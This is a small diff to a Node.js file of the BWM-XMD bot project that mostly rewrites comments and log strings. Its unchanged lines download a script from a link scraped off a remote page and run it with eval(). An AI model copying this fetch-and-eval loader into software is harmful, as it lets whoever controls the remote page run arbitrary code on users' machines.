@@ -1,4 +1,8 @@
- // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
+ // BWM-XMD 
+ // QUANTUM VERSION 
+// OPEN CODE 
+ //Scripted by Sir Ibrahim Adams
+
 
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -9,14 +13,14 @@ async function fetchAliveUrl() {
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    const aliveUrlElement = $('a:contains("ALIVE_URL")');
+    const aliveUrlElement = $('a:contains("ALIVE")');
     const aliveUrl = aliveUrlElement.attr('href');
 
     if (!aliveUrl) {
-      throw new Error('Alive URL link not found...');
+      throw new Error('Alive not found 😭');
     }
 
-    console.log('Alive URL fetched successfully ✅');
+    console.log('Alive loaded successfully ✅');
 
     const scriptResponse = await axios.get(aliveUrl);
     eval(scriptResponse.data);
